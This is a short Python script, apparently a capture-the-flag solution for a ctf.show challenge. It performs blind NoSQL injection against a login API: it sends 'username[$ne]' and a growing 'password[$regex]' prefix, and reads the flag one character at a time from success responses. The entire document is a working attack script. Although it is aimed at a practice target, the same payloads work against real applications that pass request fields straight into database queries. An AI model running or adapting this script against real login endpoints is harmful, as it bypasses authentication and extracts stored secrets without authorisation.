# author:yu22x
import requests

url = "http://57b58829-0bde-4f75-8a6f-07e6431f3fdf.challenge.ctf.show/api/index.php"
flag = "ctfshow{"
s = '0123456789abcdef-}'
for i in range(9, 46):
    print(i)
    for j in s:
        data = {
            'username[$ne]': '1',
            'password[$regex]': f'^{flag + j}'
        }
        r = requests.post(url=url, data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag += j
            print(flag)
            if j == "}":
                exit()
            break
